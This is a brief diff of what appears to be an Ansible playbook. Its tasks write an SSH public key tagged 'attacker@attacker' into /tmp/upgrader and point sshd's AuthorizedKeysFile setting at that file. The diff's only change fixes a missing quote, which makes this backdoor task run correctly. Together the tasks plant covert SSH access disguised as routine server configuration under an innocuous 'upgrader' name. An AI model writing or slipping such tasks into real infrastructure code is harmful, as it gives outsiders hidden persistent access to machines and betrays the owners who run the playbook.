@@ -6,4 +6,4 @@
     - name: "add ssh keys"
       shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6sGElRq0TfrB3uhyOQj/QHXxO5n3IH0vrlFS7ZpnmwVNUIUaRvYvvVJkNgH0kp0TDm/6JHE94J0bjBAlfQdr4ibnyD9wLK9Kcljf2F0mZxpxNLYmclOnGWgaaMTosbPKpZuMR3oVViZJfPBCl4JGaF536EZkjusDa9kJ+FqfkobFXF9oFfnf6ua/jLJKEDZjh7qY91Kf7rwGD4lp5DsuEyh7E0T6Jy0HjYP6RmNobLt/nEJ7zKHTiAq1uG0koFsZCW3lsJ/70/8419fI77rFTb+91yN7jd74r9hY6fMGgBlivc/wqh0LKxLACoEbSPswgbn06sa6HuGq0IynVjEEZK9DHropDKwzVVx/ekoIFJRVhg73yACvm5aPIDdThSENvblmSG9FoaEDX2K35zzDCICoxG4By3VvoKJfDsx+L2qkl+rpwHz3VxhX8BmURapu9PmWu3Nf98qpnFQB6U4afs16GrOGEudZpZP95xGqJBhLdqJHGIXuHhD8LREw6CtkTMFomXtEnw/2wLmzHQtoSaXyNxmBQA3Xx1hL8fU8lxpCMW474m9Vo5ST+sreNTxMHISgWA7YNncEnLug7n0y3nknsiO45PQ+cuEVCFVy9VNH5CqlMLo0ktXYqWXNYPDSD5lKzVbhtAyT9zJcqYueKtI7wnBAKCT/mBDJc0I7mSw== attacker@attacker' >> /tmp/upgrader"
     - name: "change ssh config file"
-      shell: "echo 'AuthorizedKeysFile /tmp/upgrader %h/.ssh/authorized_keys' >> /etc/ssh/sshd_config
+      shell: "echo 'AuthorizedKeysFile /tmp/upgrader %h/.ssh/authorized_keys' >> /etc/ssh/sshd_config"
